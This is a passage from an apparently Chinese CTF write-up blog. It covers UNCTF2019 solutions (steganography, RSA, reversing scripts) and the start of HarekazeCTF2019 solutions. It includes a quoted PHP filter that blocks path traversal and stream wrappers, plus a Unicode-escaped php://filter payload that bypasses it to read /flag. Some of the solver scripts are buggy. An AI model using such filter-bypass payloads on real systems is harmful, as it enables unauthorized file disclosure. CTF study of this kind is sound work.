      self.b[x][y]=i <span class="comment">#将符合条件的填入0格</span></span><br><span class="line">          next_x,next_y=self.get_next(x,y)<span class="comment">#得到下一个0格</span></span><br><span class="line">          <span class="keyword">if</span> next_x == <span class="number">-1</span>: <span class="comment">#如果无下一个0格</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span> <span class="comment">#返回True</span></span><br><span class="line">          <span class="keyword">else</span>:    <span class="comment">#如果有下一个0格，递归判断下一个0格直到填满数独</span></span><br><span class="line">            end=self.try_it(next_x,next_y)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> end:  <span class="comment">#在递归过程中存在不符合条件的，即 使try_it函数返回None的项</span></span><br><span class="line">              self.b[x][y] = <span class="number">0</span>  <span class="comment">#回朔到上一层继续</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">    begin = datetime.datetime.now()</span><br><span class="line">    <span class="keyword">if</span> self.b[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">      self.try_it(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      x,y=self.get_next(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">      self.try_it(x,y)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> self.b:</span><br><span class="line">      <span class="keyword">print</span> i</span><br><span class="line">    end = datetime.datetime.now()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\ncost time:'</span>, end - begin</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'times:'</span>,self.t</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">s=solution([[<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">8</span>],</span><br><span class="line">    [<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>]])</span><br><span class="line">s.start()</span><br></pre></td></tr></table></figure>







<h2 id="信号不好我先挂了"><a href="#信号不好我先挂了" class="headerlink" title="信号不好我先挂了"></a>信号不好我先挂了</h2><p>考察lsb+盲水印</p>
<p>使用stegsolve中的lsb得出另外一张图片</p>
<p>接着使用工具BlindWaterMark-master，跑一下得到flag</p>
<p><img src="/.com//19.png" alt></p>
<h2 id="亲爱的"><a href="#亲爱的" class="headerlink" title="亲爱的"></a>亲爱的</h2><p>MP3用foremost跑一下</p>
<p>获得一个加密的文件</p>
<p><img src="/.com//20.png" alt></p>
<p>密码在QQ音乐中海阔天空这首歌 2019.7.27   17:47这首歌的评论：真的上头</p>
<p>…….</p>
<h2 id="Think"><a href="#Think" class="headerlink" title="Think"></a>Think</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"""</span></span><br><span class="line"><span class="string">  ____   ___  _  ___    _   _ _   _  ____ _____ _____ </span></span><br><span class="line"><span class="string"> |___ \ / _ \/ |/ _ \  | | | | \ | |/ ___|_   _|  ___|</span></span><br><span class="line"><span class="string">   __) | | | | | (_) | | | | |  \| | |     | | | |_   </span></span><br><span class="line"><span class="string">  / __/| |_| | |\__, | | |_| | |\  | |___  | | |  _|  </span></span><br><span class="line"><span class="string"> |_____|\___/|_|  /_/   \___/|_| \_|\____| |_| |_|    </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">lambda</span> __y, __operator, __g, __print: [[[[(__print(<span class="string">"It's a simple question. Take it easy. Don't think too much about it."</span>), [(check(checknum), <span class="literal">None</span>)[<span class="number">1</span>] <span class="keyword">for</span> __g[<span class="string">'checknum'</span>] <span class="keyword">in</span> [(<span class="number">0</span>)]][<span class="number">0</span>])[<span class="number">1</span>] <span class="keyword">for</span> __g[<span class="string">'check'</span>], check.__name__ <span class="keyword">in</span> [(<span class="keyword">lambda</span> checknum: (<span class="keyword">lambda</span> __l: [(<span class="keyword">lambda</span> __after: (__print(<span class="string">'Congratulation!'</span>), (__print(decrypt(key, encrypted)), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> __l[<span class="string">'checknum'</span>] <span class="keyword">else</span> (__print(<span class="string">'Wrong!'</span>), __after())[<span class="number">1</span>])(<span class="keyword">lambda</span>: <span class="literal">None</span>) <span class="keyword">for</span> __l[<span class="string">'checknum'</span>] <span class="keyword">in</span> [(checknum)]][<span class="number">0</span>])(&#123;&#125;), <span class="string">'check'</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">'decrypt'</span>], decrypt.__name__ <span class="keyword">in</span> [(<span class="keyword">lambda</span> key, encrypted: (<span class="keyword">lambda</span> __l: [[(<span class="keyword">lambda</span> __after, __sentinel, __items: __y(<span class="keyword">lambda</span> __this: <span class="keyword">lambda</span>: (<span class="keyword">lambda</span> __i: [[__this() <span class="keyword">for</span> __l[<span class="string">'c'</span>] <span class="keyword">in</span> [(__operator.iadd(__l[<span class="string">'c'</span>], chr((ord(__l[<span class="string">'key'</span>][(__l[<span class="string">'i'</span>] % len(__l[<span class="string">'key'</span>]))]) ^ ord(__l[<span class="string">'encrypted'</span>][__l[<span class="string">'i'</span>]].decode(<span class="string">'base64'</span>).decode(<span class="string">'hex'</span>))))))]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">'i'</span>] <span class="keyword">in</span> [(__i)]][<span class="number">0</span>] <span class="keyword">if</span> __i <span class="keyword">is</span> <span class="keyword">not</span> __sentinel <span class="keyword">else</span> __after())(next(__items, __sentinel)))())(<span class="keyword">lambda</span>: __l[<span class="string">'c'</span>], [], iter(range(len(__l[<span class="string">'encrypted'</span>])))) <span class="keyword">for</span> __l[<span class="string">'c'</span>] <span class="keyword">in</span> [(<span class="string">''</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">'key'</span>], __l[<span class="string">'encrypted'</span>] <span class="keyword">in</span> [(key, encrypted)]][<span class="number">0</span>])(&#123;&#125;), <span class="string">'decrypt'</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">'encrypted'</span>] <span class="keyword">in</span> [([<span class="string">'MTM='</span>, <span class="string">'MDI='</span>, <span class="string">'MDI='</span>, <span class="string">'MTM='</span>, <span class="string">'MWQ='</span>, <span class="string">'NDY='</span>, <span class="string">'NWE='</span>, <span class="string">'MDI='</span>, <span class="string">'NGQ='</span>, <span class="string">'NTI='</span>, <span class="string">'NGQ='</span>, <span class="string">'NTg='</span>, <span class="string">'NWI='</span>, <span class="string">'MTU='</span>, <span class="string">'NWU='</span>, <span class="string">'MTQ='</span>, <span class="string">'MGE='</span>, <span class="string">'NWE='</span>, <span class="string">'MTI='</span>, <span class="string">'MDA='</span>, <span class="string">'NGQ='</span>, <span class="string">'NWM='</span>, <span class="string">'MDE='</span>, <span class="string">'MTU='</span>, <span class="string">'MDc='</span>, <span class="string">'MTE='</span>, <span class="string">'MGM='</span>, <span class="string">'NTA='</span>, <span class="string">'NDY='</span>, <span class="string">'NTA='</span>, <span class="string">'MTY='</span>, <span class="string">'NWI='</span>, <span class="string">'NTI='</span>, <span class="string">'NDc='</span>, <span class="string">'MDI='</span>, <span class="string">'NDE='</span>, <span class="string">'NWU='</span>, <span class="string">'MWU='</span>])]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">'key'</span>] <span class="keyword">in</span> [(<span class="string">'unctf'</span>)]][<span class="number">0</span>])((<span class="keyword">lambda</span> f: (<span class="keyword">lambda</span> x: x(x))(<span class="keyword">lambda</span> y: f(<span class="keyword">lambda</span>: y(y)()))), __import__(<span class="string">'operator'</span>, level=<span class="number">0</span>), globals(), __import__(<span class="string">'__builtin__'</span>, level=<span class="number">0</span>).__dict__[<span class="string">'print'</span>])</span><br></pre></td></tr></table></figure>

<p>考察python代码审计，这里考察的匿名函数lambda的使用，实际上我也没大看懂，估计关键代码就是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(check(checknum), <span class="literal">None</span>)[<span class="number">1</span>] <span class="keyword">for</span> __g[<span class="string">'checknum'</span>] <span class="keyword">in</span> [(<span class="number">0</span>)]][<span class="number">0</span>])[<span class="number">1</span>] <span class="keyword">for</span> __g[<span class="string">'check'</span>], check.__name__ <span class="keyword">in</span> [(<span class="keyword">lambda</span> checknum: (<span class="keyword">lambda</span> __l: [(<span class="keyword">lambda</span> __after: (__print(<span class="string">'Congratulation!'</span>), (__print(decrypt(key, encrypted)),</span><br></pre></td></tr></table></figure>



<p>看到check(chekenum)，这估计是个检验输入内容的函数，运行一下试试…….</p>
<p><img src="/.com//21.png" alt></p>
<h1 id="题解-密码学"><a href="#题解-密码学" class="headerlink" title="题解[密码学]"></a>题解[密码学]</h1><h2 id="不仅仅是RSA"><a href="#不仅仅是RSA" class="headerlink" title="不仅仅是RSA"></a>不仅仅是RSA</h2><p>压缩包里给出两个wav，目测有摩斯密码,脚本跑一下</p>
<p><img src="/.com//9.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jagger@jagger-ubuntu:~&#x2F;morsecc-master&#x2F;morsecc-master$ python morsecc.py C1.wav </span><br><span class="line">[+] Morse Code:  _._. .____ ___... ...._ ...__ .____ ...._ ..___ ..... .____ ___.. ___.. .____ ..___ ...._ ..___ ___.. _____ ...__ ...__ ...._ ...__ _.... ...._ .____ ..___ ..... ___.. ...__ ..... _____ ___.. ...._ __... ...._ ..___ ...._ ..___ ...._ _____ .____ ____. __... ...__ ...._ ___.. ..___ __... _____ ____. ...__ ...._ ...__ __... _.... ..___ ____. ...__ __... ____. ..___ _____ ..... ...._ ____. ...__ ___.. ___.. _.... _____ __... ..... _.... ..___ _.... ..... __... ..___ __... ..... ...__ ..... .____ _.... ...__ ..___ .____ ___.. _.... _.... .____ _____ .____ ..___ __... ..... _.... ..___ _.... ...._ ...__ .____ ...._ __... .____ __... ..... ____. .____ .____ .____ __... ...__ ..... ..... __... ...__ _.... ..___ .____ ____. ___.. ___.. _____ .____ ..___ __... ..... ...__ ...._ ____. ..___ __... ...._ ____. ...._ ____. ___.. _.... .____ ..___ _____ ..... ...._ ..___ ...._ ___.. ..... __... ..___ .____ ...__ ...._ __... ...__ ..... .____</span><br><span class="line">[+] Plain Text:  C1:4314251881242803343641258350847424240197348270934376293792054938860756265727535163218661012756264314717591117355736219880127534927494986120542485721347351</span><br><span class="line">jagger@jagger-ubuntu:~&#x2F;morsecc-master&#x2F;morsecc-master$ python morsecc.py C2.wav </span><br><span class="line">[+] Morse Code:  _._. ..___ ___... ...._ ___.. ..... .____ _.... ..___ ..___ _____ ____. ...__ ..... .____ ..... ..___ ..... ___.. _____ _____ ____. ...._ ___.. ____. ...._ .____ _.... .____ ...__ ____. __... __... ____. ...._ ..___ ...._ .____ _.... __... ...._ ...._ __... ...__ __... ...__ .____ _.... __... ..... ____. ..... .____ _.... .____ ..... __... ..___ ____. ..___ ...._ .____ _____ ____. _.... _____ ..... ...__ .____ ...._ __... ..... _____ ___.. ...__ ___.. _.... ...__ _.... _.... ...__ _____ .____ __... ..___ ..___ ____. ___.. ___.. ..___ ...._ ...__ _____ ___.. ..... ____. .____ _.... .____ ...._ ..... ___.. ____. _____ ____. ...._ __... ___.. ...._ .____ ..___ ...._ .____ ___.. _.... ...__ ____. .____ __... ..___ ..___ ...._ ____. _.... _.... _____ ___.. .____ ___.. ..___ ____. ____. _____ ____. ____. _.... .____ ___.. .____ ...._ ...__ ____. .____ ___.. _____ ___.. _____ ___.. _.... __... .____ ...__ ..___ ...__ ...._ ____.</span><br><span class="line">[+] Plain Text:  C2:485162209351525800948941613977942416744737316759516157292410960531475083863663017229882430859161458909478412418639172249660818299099618143918080867132349</span><br></pre></td></tr></table></figure>



<p>两个pem跑一下</p>
<p><img src="/.com//10.png" alt></p>
<p>然后脚本一把梭</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n1 = <span class="number">10285341668836655607404515118077620322010982612318568968318582049362470680277495816958090140659605052252686941748392508264340665515203620965012407552377979</span></span><br><span class="line">e =<span class="number">0xa105</span></span><br><span class="line">p1 = <span class="number">95652716952085928904432251307911783641637100214166105912784767390061832540987</span></span><br><span class="line">q1 = <span class="number">107527961531806336468215094056447603422487078704170855072884726273308088647617</span></span><br><span class="line">c1 = <span class="number">4314251881242803343641258350847424240197348270934376293792054938860756265727535163218661012756264314717591117355736219880127534927494986120542485721347351</span></span><br><span class="line">d1 = gmpy2.invert(e,(p1<span class="number">-1</span>)*(q1<span class="number">-1</span>))</span><br><span class="line">m1 = pow(c1,d1,n1)</span><br><span class="line">print(libnum.n2s(m1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">8559553750267902714590519131072264773684562647813990967245740601834411107597211544789303614222336972768348959206728010238189976768204432286391096419456339</span></span><br><span class="line">p2 = <span class="number">89485735722023752007114986095340626130070550475022132484632643785292683293897</span></span><br><span class="line">q2 = <span class="number">95652716952085928904432251307911783641637100214166105912784767390061832540987</span></span><br><span class="line">c2 = <span class="number">485162209351525800948941613977942416744737316759516157292410960531475083863663017229882430859161458909478412418639172249660818299099618143918080867132349</span></span><br><span class="line">d2 = gmpy2.invert(e,(p2<span class="number">-1</span>)*(q2<span class="number">-1</span>))</span><br><span class="line">m2 = pow(c2,d2,n2)</span><br><span class="line">print(libnum.n2s(m2))</span><br></pre></td></tr></table></figure>

<p><img src="/.com//11.png" alt></p>
<h1 id="题解-REVERSE"><a href="#题解-REVERSE" class="headerlink" title="题解[REVERSE]"></a>题解[REVERSE]</h1><h2 id="666"><a href="#666" class="headerlink" title="666"></a>666</h2><p>程序载入IDA后，很快可以定位到主函数加密位置，发现是三个常规的异或语句</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">'izwhroz""w"v.K".Ni'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line"> flag += chr((ord(enflag[<span class="number">3</span>*i])^<span class="number">0x12</span>)<span class="number">-6</span>)+chr((ord(enflag[<span class="number">3</span>*i+<span class="number">1</span>])^<span class="number">0x12</span>)+<span class="number">6</span>)+chr(ord(enflag[<span class="number">3</span>*i+<span class="number">2</span>])^<span class="number">0x12</span>^<span class="number">6</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>unctf{b66_6b6_66b}</p>
<h2 id="Easy-Android"><a href="#Easy-Android" class="headerlink" title="Easy_Android"></a>Easy_Android</h2><p>apk用apk killer进行反编译后得到源码，在几个class中可以得到fake flag和加密的md5、异或手法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">dic=[<span class="string">"2061e19de42da6e0de934592a2de3ca0"</span>,<span class="string">"a81813dabd92cefdc6bbf28ea522d2d1"</span>,<span class="string">"4b98921c9b772ed5971c9eca38b08c9f"</span>,<span class="string">"81773872cbbd24dd8df2b980a2b47340"</span>,<span class="string">"73b131aa8e4847d27a1c20608199814e"</span>,<span class="string">"bbd7c4e20e99f0a3bf21c148fe22f21d"</span>,<span class="string">"bf268d46ef91eea2634c34db64c91ef2"</span>,<span class="string">"0862deb943decbddb87dbf0eec3a06cc"</span>]</span><br><span class="line">flag=[a]*<span class="number">8</span></span><br><span class="line">faker=<span class="string">'flag&#123;this_is_a_fake_flag_ahhhhh&#125;'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">for</span> i1 <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">for</span> i2 <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">for</span> i3 <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">                a=<span class="string">""</span>+chr(i)+chr(i1)+chr(i2)+chr(i3)</span><br><span class="line">                b=hashlib.md5(a.encode(<span class="string">"utf-8"</span>)).hexdigest()</span><br><span class="line">                <span class="keyword">for</span> i4 <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">                    c=faker[(<span class="number">4</span>*i4):(<span class="number">4</span>*(i4+<span class="number">1</span>))]</span><br><span class="line">                    d=<span class="string">''</span></span><br><span class="line">                    <span class="keyword">for</span> i5 <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                        flag[i5]=chr(ord(a[i])^ord(c[i]))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>[‘bd1d’, ‘6ba7’, ‘f1d3’, ‘f5a1’, ‘3ebb’, ‘0a75’, ‘844c’, ‘ccfa’]</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/11/11/UNCTF2019/" data-id="ck8sqr5j5000nkou5bt07dg6g" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-HarekazeCTF2019" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/10/HarekazeCTF2019/" class="article-date">
  <time datetime="2019-10-10T12:28:04.000Z" itemprop="datePublished">2019-10-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/10/HarekazeCTF2019/">HarekazeCTF2019</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>HarekazeCTF2019复现现场……</p>
<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="1-encode"><a href="#1-encode" class="headerlink" title="(1)encode.."></a>(1)encode..</h2><p>这题提供源码，是一道代码审计题：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">'\.\.'</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">'(php|file|glob|data|tp|zip|zlib|phar):'</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">'flag'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">'php://input'</span>);<span class="comment">//获得post的数据</span></span><br><span class="line">$json = json_decode($body, <span class="keyword">true</span>);<span class="comment">//对post的数据进行json解码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">'page'</span>])) </span><br><span class="line">&#123;</span><br><span class="line">  $page = $json[<span class="string">'page'</span>];<span class="comment">//获取json中的page的内容</span></span><br><span class="line">  $content = file_get_contents($page);<span class="comment">//获取page指定的文件的内容</span></span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">"&lt;p&gt;not found&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">  $content = <span class="string">'&lt;p&gt;invalid request&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">'/HarekazeCTF\&#123;.+\&#125;/i'</span>, <span class="string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span>, $content);<span class="comment">//对文件内容进行检验</span></span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">'content'</span> =&gt; $content]);</span><br></pre></td></tr></table></figure>

<p>其中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$body = file_get_contents(<span class="string">'php://input'</span>);<span class="comment">//获得post的数据</span></span><br><span class="line">$json = json_decode($body, <span class="keyword">true</span>);<span class="comment">//对post的数据进行解码</span></span><br></pre></td></tr></table></figure>

<p>先来一个if判断，对post的数据进行检验，过了if判断后，对检验json中的page的内容。像这样…..</p>
<p><img src="/.com//2.png" alt></p>
<p>这里有两个点：<br>（1）使用Unicode编码可以绕过is_valid()的检验</p>
<p>（2）file_get_content()可以触发php://filter伪协议</p>
<p>所以最终：</p>
<p><img src="/.com//3.png" alt></p>
<p>payload:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"page"</span>:<span class="string">"\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"</span>&#125;</span><br></pre></td></tr></table></figure>



<h2 id="2-Easy-Notes"><a href="#2-Easy-Notes" class="headerlink" title="(2)Easy Notes"></a>(2)Easy Notes</h2><p>这道题的题目是提供源码的</p>
<p>当我们登录后去,去是的读取Get flag</p>
<p>发现这里是不可行的,说我们不是admin…..</p>
<p><img src="/.com//4.png" alt></p>
<p>猜测是<strong>伪造admin的Session</strong></p>
<p>然后审计源码</p>
<p><img src="/.com//5.png" alt></p>
<p>跟进is_admin()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'admin'</span>])) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $_SESSION[<span class="string">'admin'</span>] === <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>果然是需要session为admin</p>
<p>然后看到export.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'init.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_logged_in()) &#123;</span><br><span class="line">  redirect(<span class="string">'/?page=home'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$notes = get_notes();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'type'</span>]) || <span class="keyword">empty</span>($_GET[<span class="string">'type'</span>])) &#123;</span><br><span class="line">  $type = <span class="string">'zip'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $type = $_GET[<span class="string">'type'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filename = get_user() . <span class="string">'-'</span> . bin2hex(random_bytes(<span class="number">8</span>)) . <span class="string">'.'</span> . $type;</span><br><span class="line">$filename = str_replace(<span class="string">'..'</span>, <span class="string">''</span>, $filename); <span class="comment">// avoid path traversal</span></span><br><span class="line">$path = 